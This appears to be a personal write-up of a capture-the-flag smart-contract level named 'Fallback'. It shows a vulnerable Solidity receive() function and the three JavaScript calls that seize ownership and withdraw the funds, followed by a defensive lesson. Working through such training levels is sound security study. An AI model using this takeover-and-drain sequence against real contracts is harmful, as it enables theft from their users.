# Level 1: Fallback

**Date:** January 19, 2026
**Status:** ✅ Done

## What I Found

The fallback function lets anyone become owner by sending ETH.

**The bug:**
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender; // Anyone can become owner!
}
```

## How I Exploited It

1. Contributed tiny amount:
```javascript
await contract.contribute({value: toWei("0.0001")})
```

2. Sent ETH to trigger fallback:
```javascript
await contract.sendTransaction({value: toWei("0.0001")})
```

3. Became owner and withdrew:
```javascript
await contract.withdraw()
```

## What I Learned

Never put ownership changes in fallback functions. This is how protocols get drained.

As a trader, I've seen this pattern cause millions in losses.
